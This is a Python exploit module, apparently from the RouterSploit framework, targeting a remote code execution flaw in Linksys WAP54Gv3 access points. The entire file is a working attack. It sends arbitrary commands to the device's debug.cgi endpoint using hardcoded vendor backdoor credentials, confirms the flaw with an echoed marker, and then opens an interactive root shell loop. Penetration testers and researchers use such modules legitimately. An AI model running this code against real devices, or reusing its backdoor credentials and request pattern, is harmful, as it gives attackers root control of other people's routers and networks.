import requests
import re

from routersploit import *


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Linksys WAP54Gv3 devices Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands with root privileges.
    """
    __info__ = {
        'name': 'Linksys WAP54Gv3',
        'description': 'Module exploits remote command execution in Linksys WAP54Gv3 devices. Debug interface allows executing root privileged shell commands is available on dedicated web pages on the device.',
        'authors': [
            'Phil Purviance', # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>', # routersploit module
        ],
        'references': [
            'http://seclists.org/bugtraq/2010/Jun/93',
        ],
        'targets': [
            'Linksys WAP54Gv3',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check() == True:
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")
            print self.execute(cmd)

    def execute(self, cmd):
        url = sanitize_url("{}:{}/debug.cgi".format(self.target, self.port))
        data = {"data1": cmd, "command": "ui_debug"}

        try:
            r = requests.post(url, data=data, auth=("Gemtek", "gemtekswd"))
        except requests.exceptions.MissingSchema:
            return "Invalid URL format: %s" % url
        except requests.exceptions.ConnectionError:
            return "Connection error: %s" % url

        res = re.findall('<textarea rows=30 cols=100>(.+?)</textarea>', r.text, re.DOTALL)

        if len(res):
            return res[0]
        else:
            return ""

    def check(self):
        # meaby random mark should be implemented
        cmd = "echo 9fdbd928b52c1ef61615a6fd2e8b49af"
        url = sanitize_url("{}:{}/debug.cgi".format(self.target, self.port))
        data = {"data1": cmd, "command": "ui_debug"}

        try:
            r = requests.post(url, data=data, auth=("Gemtek", "gemtekswd"))
            res = r.text
        except:
            return None # could not be verified

        if "9fdbd928b52c1ef61615a6fd2e8b49af" in res:
            return True

        return False

